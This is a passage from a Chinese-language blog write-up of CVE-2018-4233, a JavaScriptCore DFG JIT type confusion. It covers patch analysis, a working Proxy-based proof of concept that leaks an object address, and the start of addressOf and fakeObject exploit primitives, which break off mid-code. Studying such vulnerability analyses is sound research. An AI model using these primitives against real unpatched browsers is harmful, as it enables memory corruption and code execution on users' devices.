<h1 id="0x02-漏洞分析利用"><a href="#0x02-漏洞分析利用" class="headerlink" title="0x02 漏洞分析利用"></a>0x02 漏洞分析利用</h1><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index e7f<span class="number">1585.</span>.fc1a7c5 <span class="number">100644</span> (file)</span><br><span class="line">--- a/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h</span><br><span class="line">+++ b/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h</span><br><span class="line">@@ <span class="number">-1</span>,<span class="number">5</span> <span class="number">+1</span>,<span class="number">5</span> @@</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">- * Copyright (C) 2013-2017 Apple Inc. All rights reserved.</span></span><br><span class="line"><span class="comment">+ * Copyright (C) 2013-2018 Apple Inc. All rights reserved.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">  * modification, are permitted provided that the following conditions</span></span><br><span class="line"><span class="comment">@@ -2274,6 +2274,7 @@ bool AbstractInterpreter&lt;AbstractStateType&gt;::executeEffects(unsigned clobberLimi</span></span><br><span class="line"><span class="comment">                 &#125;</span></span><br><span class="line"><span class="comment">             &#125;</span></span><br><span class="line"><span class="comment">         &#125;</span></span><br><span class="line"><span class="comment">+        clobberWorld(node-&gt;origin.semantic, clobberLimit);</span></span><br><span class="line"><span class="comment">         forNode(node).setType(m_graph, SpecFinalObject);</span></span><br><span class="line"><span class="comment">         break;</span></span><br><span class="line"><span class="comment">     &#125;</span></span><br></pre></td></tr></table></figure>
<p>该patch修复了漏洞，patch位于文件Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGAbstractInterpreterInlines.h中的executeEffects函数，从文件路径可以知道，这个漏洞与DFG JIT有关，executeEffects是当DFG JIT做优化时处理side Effects时用的,与v8一个道理，side Effects即一些潜在的侧链影响，通俗来讲就是判断某个操作是否会影响类型变化，如果会影响，放弃之前的类型推断，如果不影响，继续使用之前的类型。patch位于函数中switch的case CreateThis:分支，主要就是遍历字节码，遇到CreateThis时，调用clobberWorld函数放弃前面的类型推断。那么这也就是说，原来的漏洞点在于CreateThis是存在会影响对象类型的，但是DFG JIT没有判断出来，这就导致类型混淆。</p>
<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>首先，要得到create_this字节码，使用的是this</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">foo</span>();</span><br><span class="line"><span class="title function_">print</span>(b.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>
<p>得到的字节码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[   <span class="number">0</span>] enter             </span><br><span class="line">[   <span class="number">1</span>] get_scope         loc3</span><br><span class="line">[   <span class="number">3</span>] mov               loc4, loc3</span><br><span class="line">[   <span class="number">6</span>] check_traps       </span><br><span class="line">[   <span class="number">7</span>] mov               loc5, <span class="variable language_">this</span></span><br><span class="line">[  <span class="number">10</span>] create_this       <span class="variable language_">this</span>, <span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">[  <span class="number">15</span>] put_by_id         <span class="variable language_">this</span>, <span class="title function_">x</span>(@id0), <span class="title class_">Int32</span>: <span class="number">1</span>(const0), <span class="title class_">Bottom</span></span><br><span class="line">[  <span class="number">24</span>] ret               <span class="variable language_">this</span></span><br></pre></td></tr></table></figure>
<p>可以看到，通过put_by_id字节码指令将1存入x属性中。现在我们将测试代码稍作修改</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">foo</span>([<span class="number">1.1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(b.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>
<p>字节码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[   <span class="number">0</span>] enter             </span><br><span class="line">[   <span class="number">1</span>] get_scope         loc3</span><br><span class="line">[   <span class="number">3</span>] mov               loc4, loc3</span><br><span class="line">[   <span class="number">6</span>] check_traps       </span><br><span class="line">[   <span class="number">7</span>] mov               loc5, <span class="variable language_">this</span></span><br><span class="line">[  <span class="number">10</span>] create_this       <span class="variable language_">this</span>, <span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">[  <span class="number">15</span>] mov               loc6, <span class="variable language_">this</span></span><br><span class="line">[  <span class="number">18</span>] get_by_val        loc7, arg1, <span class="title class_">Int32</span>: <span class="number">0</span>(const0)    <span class="title class_">Original</span>; predicting <span class="title class_">None</span></span><br><span class="line">[  <span class="number">24</span>] put_by_id         loc6, <span class="title function_">x</span>(@id0), loc7, <span class="title class_">Bottom</span></span><br><span class="line">[  <span class="number">33</span>] ret               <span class="variable language_">this</span></span><br></pre></td></tr></table></figure>
<p>通过get_by_val字节码指令从数组中取出元素0，然后通过put_by_id存入属性x中。<br>现在加入触发DFG JIT优化的代码，再做测试,发现前期Parse以后的字节码是一样的，不同点在于这次存在了DFG JIT时的字节码展开，其中[ 10] create_this this, this, 1, 0和[ 18] get_by_val loc7, arg1, Int32: 0(const0) Original; predicting None被展开如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">10</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">CheckCell</span></span><br><span class="line"><span class="title class_">NewObject</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line">[<span class="number">18</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">JSConstant</span></span><br><span class="line"><span class="title class_">GetButterfly</span></span><br><span class="line"><span class="title class_">GetByVal</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line"><span class="title class_">ValueRep</span></span><br></pre></td></tr></table></figure>
<p>可以知道，CreateThis被优化为了CheckCell和NewObject，并且在这种情况下参数arg的类型不可能发生变化，因此在[ 0] enter使用了CheckStructure检查一次参数就可以了，这里无需再重复检查。现在，我们尝试为foo函数增加一个Proxy代理，这样，使用foo_proxy对象对foo进行间接访问时，会被代理拦截，并进入handler的get函数中处理。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">   <span class="title function_">get</span>(<span class="params">target, prop</span>) &#123;</span><br><span class="line">      <span class="title function_">print</span>(prop);</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo, handler);</span><br><span class="line"><span class="title function_">print</span>(foo_proxy.<span class="property">a</span>);</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/bug_bin# ./jsc t.js</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>因为我们通过foo_proxy.a间接的访问了foo.a属性，所以被拦截了。那我们使用new foo_proxy()会发生什么呢？</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">   <span class="title function_">get</span>(<span class="params">target, prop</span>) &#123;</span><br><span class="line">      <span class="title function_">print</span>(prop);</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo, handler);</span><br><span class="line"><span class="title function_">print</span>(<span class="keyword">new</span> <span class="title function_">foo_proxy</span>([<span class="number">1.1</span>]));</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/bug_bin# ./jsc t.js</span><br><span class="line">prototype</span><br></pre></td></tr></table></figure>
<p>因为在创建一个对象的时候，是需要用到函数的prototype这个属性的，它是函数的原型，也是foo的一个自带属性，因此在创建对象时也可以被成功拦截。我们尝试加入DFG JIT优化，并查看字节码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">   <span class="title function_">get</span>(<span class="params">target, prop</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo, handler);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>;i++) &#123;</span><br><span class="line">   b = <span class="keyword">new</span> <span class="title function_">foo_proxy</span>([<span class="number">1.1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(b.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>
<p>ByteCode仍然一样，不一样的是DFG JIT的Code</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">10</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">CreateThis</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line">[<span class="number">18</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">JSConstant</span></span><br><span class="line"><span class="title class_">GetButterfly</span></span><br><span class="line"><span class="title class_">GetByVal</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line"><span class="title class_">ValueRep</span></span><br></pre></td></tr></table></figure>
<p>可以看到，由于我们加入了代理，现在CreateThis不能再被内联优化，其中CreateThis的汇编调用代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffb010016e</span>: mov $0x7fffaff0b4a8, %r11</span><br><span class="line"><span class="number">0x7fffb0100178</span>: <span class="title function_">mov</span> (%r11), %r11</span><br><span class="line"><span class="number">0x7fffb010017b</span>: test %r11, %r11</span><br><span class="line"><span class="number">0x7fffb010017e</span>: jz <span class="number">0x7fffb010018b</span></span><br><span class="line"><span class="number">0x7fffb0100184</span>: mov $0x113, %r11d</span><br><span class="line"><span class="number">0x7fffb010018a</span>: int3 </span><br><span class="line"><span class="number">0x7fffb010018b</span>: cmp $0x17, <span class="number">0x5</span>(%rsi)</span><br><span class="line"><span class="number">0x7fffb010018f</span>: jnz <span class="number">0x7fffb0100565</span></span><br><span class="line"><span class="number">0x7fffb0100195</span>: mov <span class="number">0x28</span>(%rsi), %r8</span><br><span class="line"><span class="number">0x7fffb0100199</span>: test %r8, %r8</span><br><span class="line"><span class="number">0x7fffb010019c</span>: jz <span class="number">0x7fffb0100565</span></span><br><span class="line">............................</span><br></pre></td></tr></table></figure>
<p>可以知道其主要是跳转到了0x7fffb0100565这个地址处，继续跟踪，该地址处的代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffb0100565</span>: mov %rax, -<span class="number">0x30</span>(%rbp)</span><br><span class="line"><span class="number">0x7fffb0100569</span>: mov %rsi, -<span class="number">0x38</span>(%rbp)</span><br><span class="line"><span class="number">0x7fffb010056d</span>: mov %rbp, %rdi</span><br><span class="line"><span class="number">0x7fffb0100570</span>: mov $0x1, %edx</span><br><span class="line"><span class="number">0x7fffb0100575</span>: mov $0x7fffaff09898, %r11</span><br><span class="line"><span class="number">0x7fffb010057f</span>: mov $0xbadbeef, (%r11)</span><br><span class="line"><span class="number">0x7fffb0100586</span>: mov $0x7fffaff0989c, %r11</span><br><span class="line"><span class="number">0x7fffb0100590</span>: mov $0xbadbeef, (%r11)</span><br><span class="line"><span class="number">0x7fffb0100597</span>: mov $0x6, <span class="number">0x24</span>(%rbp)</span><br><span class="line"><span class="number">0x7fffb010059e</span>: mov $0x7ffff6113791, %r11</span><br><span class="line"><span class="number">0x7fffb01005a8</span>: call *%r11</span><br></pre></td></tr></table></figure>
<img src="/ha1vk/2021/06/21/CVE-2018-4233/4.png" class="">
<p>通过调试，可以知道这里调用的函数是operationCreateThis这个函数，其源码位于文件Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGOperations.cpp中</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSC_DEFINE_JIT_OPERATION</span>(operationCreateThis, JSCell*, (JSGlobalObject* globalObject, JSObject* constructor, <span class="type">uint32_t</span> inlineCapacity))</span><br><span class="line">&#123;</span><br><span class="line">    VM&amp; vm = globalObject-&gt;<span class="built_in">vm</span>();</span><br><span class="line">    CallFrame* callFrame = <span class="built_in">DECLARE_CALL_FRAME</span>(vm);</span><br><span class="line">    <span class="function">JITOperationPrologueCallFrameTracer <span class="title">tracer</span><span class="params">(vm, callFrame)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> scope = <span class="built_in">DECLARE_THROW_SCOPE</span>(vm);</span><br><span class="line">    <span class="keyword">if</span> (constructor-&gt;<span class="built_in">type</span>() == JSFunctionType &amp;&amp; <span class="built_in">jsCast</span>&lt;JSFunction*&gt;(constructor)-&gt;<span class="built_in">canUseAllocationProfile</span>()) &#123;</span><br><span class="line">        <span class="function">DeferTermination <span class="title">deferScope</span><span class="params">(vm)</span></span>;</span><br><span class="line">        <span class="keyword">auto</span> rareData = <span class="built_in">jsCast</span>&lt;JSFunction*&gt;(constructor)-&gt;<span class="built_in">ensureRareDataAndAllocationProfile</span>(globalObject, inlineCapacity);</span><br><span class="line">        scope.<span class="built_in">releaseAssertNoException</span>();</span><br><span class="line">        ObjectAllocationProfileWithPrototype* allocationProfile = rareData-&gt;<span class="built_in">objectAllocationProfile</span>();</span><br><span class="line">        Structure* structure = allocationProfile-&gt;<span class="built_in">structure</span>();</span><br><span class="line">        JSObject* result = <span class="built_in">constructEmptyObject</span>(vm, structure);</span><br><span class="line">        <span class="keyword">if</span> (structure-&gt;<span class="built_in">hasPolyProto</span>()) &#123;</span><br><span class="line">            JSObject* prototype = allocationProfile-&gt;<span class="built_in">prototype</span>();</span><br><span class="line">            <span class="built_in">ASSERT</span>(prototype == <span class="built_in">jsCast</span>&lt;JSFunction*&gt;(constructor)-&gt;<span class="built_in">prototypeForConstruction</span>(vm, globalObject));</span><br><span class="line">            result-&gt;<span class="built_in">putDirect</span>(vm, knownPolyProtoOffset, prototype);</span><br><span class="line">            prototype-&gt;<span class="built_in">didBecomePrototype</span>();</span><br><span class="line">            <span class="built_in">ASSERT_WITH_MESSAGE</span>(!<span class="built_in">hasIndexedProperties</span>(result-&gt;<span class="built_in">indexingType</span>()), <span class="string">&quot;We rely on JSFinalObject not starting out with an indexing type otherwise we would potentially need to convert to slow put storage&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSValue proto = constructor-&gt;<span class="built_in">get</span>(globalObject, vm.propertyNames-&gt;prototype);</span><br><span class="line">    <span class="built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (proto.<span class="built_in">isObject</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">constructEmptyObject</span>(globalObject, <span class="built_in">asObject</span>(proto));</span><br><span class="line">    JSGlobalObject* functionGlobalObject = <span class="built_in">getFunctionRealm</span>(globalObject, constructor);</span><br><span class="line">    <span class="built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">constructEmptyObject</span>(functionGlobalObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的操作SValue proto &#x3D; constructor-&gt;get(globalObject, vm.propertyNames-&gt;prototype);会被我们JS层中的代理拦截，由此可以知道，operationCreateThis会回调JS层的代理函数。此时我们想到，在JS中的Proxy对象的handler中，我们可以操纵任意的对象，我们可以将参数arg的类型修改掉。于是这样构造</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> trigger = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">   <span class="title function_">get</span>(<span class="params">target, prop</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (trigger) &#123;</span><br><span class="line">         arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo, handler);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>;i++) &#123;</span><br><span class="line">   b = <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trigger = <span class="literal">true</span>;</span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line"><span class="title function_">print</span>(b.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>
<p>这样，当CreateThis回调了handler中的get函数时，arr[0] &#x3D; {}将arr的类型改为了对象数组类型，不再是unboxed double，但是CreateThis回调结束以后，并没有重新对arg进行类型检查，仍然将其当做unboxed double类型，由此造成了类型混淆。<br>运行结果如下，成功输出对象的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/bug_bin# ./jsc t.js</span><br><span class="line">6.9532879215489e-310</span><br></pre></td></tr></table></figure>
<p>修复漏洞以后的版本，其DFG JIT的字节码展开如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">10</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">CreateThis</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line">[<span class="number">18</span>]</span><br><span class="line"><span class="title class_">CountExecution</span></span><br><span class="line"><span class="title class_">JSConstant</span></span><br><span class="line"><span class="title class_">CheckStructure</span></span><br><span class="line"><span class="title class_">GetButterfly</span></span><br><span class="line"><span class="title class_">GetByVal</span></span><br><span class="line"><span class="title class_">MovHint</span></span><br><span class="line"><span class="title class_">ValueRep</span></span><br></pre></td></tr></table></figure>
<p>可以看到，其在CreateThis后面增加了一个CheckStructure，从而避免了类型混淆。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="fakeObj和addressOf原语构造"><a href="#fakeObj和addressOf原语构造" class="headerlink" title="fakeObj和addressOf原语构造"></a>fakeObj和addressOf原语构造</h3><p>通过上述分析，我们很容易构造出两个原语</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">x</span> = arg[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> handler = &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params">target,prop</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (trigger) &#123;</span><br><span class="line">            arr[<span class="number">0</span>] = obj;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> target[prop];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="keyword">var</span> foo_proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(foo,handler);</span><br><span class="line">   <span class="keyword">var</span> arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">   <span class="keyword">var</span> trigger = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line">   &#125;</span><br><span class="line">   trigger = <span class="literal">true</span>;</span><br><span class="line">   <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title function_">foo_proxy</span>(arr);</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_">u64f</span>(ret.<span class="property">x</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr_l,addr_h</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> addr = <span class="title function_">p64f</span>(addr_l,addr_h);</span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">      arr[<span class="number">0</span>] = addr;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> handler = &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params">target,prop</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (trigger) &#123;</span><br><span class="line">            arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> target[prop];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">   <span 